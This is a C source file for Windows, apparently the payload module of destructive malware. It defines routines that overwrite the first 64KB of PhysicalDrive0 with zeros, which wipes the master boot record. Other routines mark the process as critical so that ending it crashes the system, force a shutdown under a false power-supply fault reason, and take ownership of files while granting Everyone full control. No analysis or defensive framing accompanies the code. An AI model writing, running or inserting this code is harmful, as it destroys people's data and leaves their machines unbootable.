#include "payloads.h"

VOID WINAPI OverrideMBR ( VOID )
{
	HANDLE hDrive;
	DWORD dwWrittenBytes;
	BOOL bSuccess;

	BYTE mbr[ 65536 ];
	memset ( mbr, 0, 65536 );

	hDrive = CreateFileW ( L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL );

	if( hDrive == INVALID_HANDLE_VALUE )
	{
		return;
	}

	bSuccess = WriteFile ( hDrive, mbr, 65536, &dwWrittenBytes, NULL );

	if( !bSuccess )
	{
		CloseHandle ( hDrive );
		return;
	}
}

BOOL
WINAPI
SetPrivilege (
	_In_ HANDLE hToken,
	_In_ PCWSTR szPrivilege,
	_In_ BOOL bEnablePrivilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if( !LookupPrivilegeValueW ( NULL, szPrivilege, &luid ) )
	{
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[ 0 ].Luid = luid;
	if( bEnablePrivilege )
		tp.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[ 0 ].Attributes = 0;

	if( !AdjustTokenPrivileges ( hToken, FALSE, &tp, sizeof ( TOKEN_PRIVILEGES ), ( PTOKEN_PRIVILEGES ) NULL, ( PDWORD ) NULL ) )
	{
		return FALSE;
	}

	if( GetLastError ( ) == ERROR_NOT_ALL_ASSIGNED )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
SetProcessCritical ( VOID )
{
	NTSTATUS ( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS ( NTAPI * RtlSetProcessIsCritical )( BOOLEAN bNew, PBOOLEAN pbOld, BOOLEAN bNeedScb );
	NTSTATUS ntReturnValue;
	ULONG ulBreakOnTermination;
	BOOLEAN bUnused;
	HMODULE hNtDll;

	hNtDll = LoadLibraryW ( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID ) GetProcAddress ( hNtDll, "RtlAdjustPrivilege" );
	RtlSetProcessIsCritical = ( PVOID ) GetProcAddress ( hNtDll, "RtlSetProcessIsCritical" );

	if( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege ( 20 /* SeDebugPrivilege */, TRUE, FALSE, &bUnused );

		if( ntReturnValue )
		{
			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	if( RtlSetProcessIsCritical )
	{
		ulBreakOnTermination = 1;
		ntReturnValue = RtlSetProcessIsCritical ( TRUE, NULL, FALSE );

		if( ntReturnValue )
		{

			return FALSE;
		}
	}
	else
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
ForceShutdownComputer ( VOID )
{
	NTSTATUS ( NTAPI * RtlAdjustPrivilege )( ULONG ulPrivilege, BOOLEAN bEnable, BOOLEAN bCurrentThread, PBOOLEAN pbEnabled );
	NTSTATUS ( NTAPI * NtShutdownSystem )( _In_ SHUTDOWN_ACTION Action );
	NTSTATUS ( NTAPI * NtSetSystemPowerState )( _In_ POWER_ACTION SystemAction, _In_ SYSTEM_POWER_STATE MinSystemState, _In_ ULONG Flags );
	NTSTATUS ntReturnValue;
	HMODULE hNtDll;
	BOOLEAN bUnused;
	BOOL bSuccess;

	hNtDll = LoadLibraryW ( L"ntdll.dll" );
	RtlAdjustPrivilege = ( PVOID ) GetProcAddress ( hNtDll, "RtlAdjustPrivilege" );
	NtSetSystemPowerState = ( PVOID ) GetProcAddress ( hNtDll, "NtSetSystemPowerState" );
	NtShutdownSystem = ( PVOID ) GetProcAddress ( hNtDll, "NtShutdownSystem" );

	if( RtlAdjustPrivilege )
	{
		ntReturnValue = RtlAdjustPrivilege ( 19 /* SeShutdownPrivilege */, TRUE, FALSE, &bUnused );

		if( ntReturnValue )
		{
			return FALSE;
		}
	}

	if( NtSetSystemPowerState )
	{
		ntReturnValue = NtSetSystemPowerState ( PowerActionShutdownOff, PowerSystemShutdown,
			SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_POWER_SUPPLY );

		if( !ntReturnValue )
		{
			return TRUE;
		}
	}

	if( NtShutdownSystem )
	{
		ntReturnValue = NtShutdownSystem ( ShutdownPowerOff );

		if( !ntReturnValue )
		{
			return TRUE;
		}
	}

	bSuccess = ExitWindowsEx ( EWX_POWEROFF, EWX_FORCE );

	if( !bSuccess )
	{
		return FALSE;
	}

	return TRUE;
}

BOOL
WINAPI
TakeOwnership (
	_In_ PWSTR szFile
)
{
	BOOL bRetval = FALSE;
	HANDLE hToken = NULL;
	PSID pSIDAdmin = NULL, pSIDEveryone = NULL;
	PACL pACL = NULL;
	SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY, SIDAuthNT = SECURITY_NT_AUTHORITY;
	EXPLICIT_ACCESS ea[ NUM_ACES ] = { 0 };
	DWORD dwRes;

	if( !AllocateAndInitializeSid ( &SIDAuthWorld, 1, SECURITY_WORLD_RID, 0, 0, 0, 0, 0, 0, 0, &pSIDEveryone ) )
	{
		goto cleanup;
	}

	if( !AllocateAndInitializeSid ( &SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSIDAdmin ) )
	{
		goto cleanup;
	}

	ea[ 0 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 0 ].grfAccessMode = SET_ACCESS;
	ea[ 0 ].grfInheritance = NO_INHERITANCE;
	ea[ 0 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 0 ].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
	ea[ 0 ].Trustee.ptstrName = ( PWSTR ) pSIDEveryone;

	ea[ 1 ].grfAccessPermissions = GENERIC_ALL;
	ea[ 1 ].grfAccessMode = SET_ACCESS;
	ea[ 1 ].grfInheritance = NO_INHERITANCE;
	ea[ 1 ].Trustee.TrusteeForm = TRUSTEE_IS_SID;
	ea[ 1 ].Trustee.TrusteeType = TRUSTEE_IS_GROUP;
	ea[ 1 ].Trustee.ptstrName = ( PWSTR ) pSIDAdmin;

	if( SetEntriesInAclW ( NUM_ACES, ea, NULL, &pACL ) != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW ( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
		goto cleanup;
	}

	if( dwRes != ERROR_ACCESS_DENIED )
	{
		goto cleanup;
	}

	if( !OpenProcessToken ( GetCurrentProcess ( ), TOKEN_ADJUST_PRIVILEGES, &hToken ) )
	{
		goto cleanup;
	}

	if( !SetPrivilege ( hToken, SE_TAKE_OWNERSHIP_NAME, TRUE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW ( szFile, SE_FILE_OBJECT, OWNER_SECURITY_INFORMATION, pSIDAdmin, NULL, NULL, NULL );

	if( dwRes != ERROR_SUCCESS )
	{
		goto cleanup;
	}

	if( !SetPrivilege ( hToken, SE_TAKE_OWNERSHIP_NAME, FALSE ) )
	{
		goto cleanup;
	}

	dwRes = SetNamedSecurityInfoW ( szFile, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, pACL, NULL );

	if( dwRes == ERROR_SUCCESS )
	{
		bRetval = TRUE;
	}

cleanup:
	if( pSIDAdmin ) FreeSid ( pSIDAdmin );
	if( pSIDEveryone ) FreeSid ( pSIDEveryone );
	if( pACL ) LocalFree ( pACL );
	if( hToken ) CloseHandle ( hToken );

	return bRetval;
}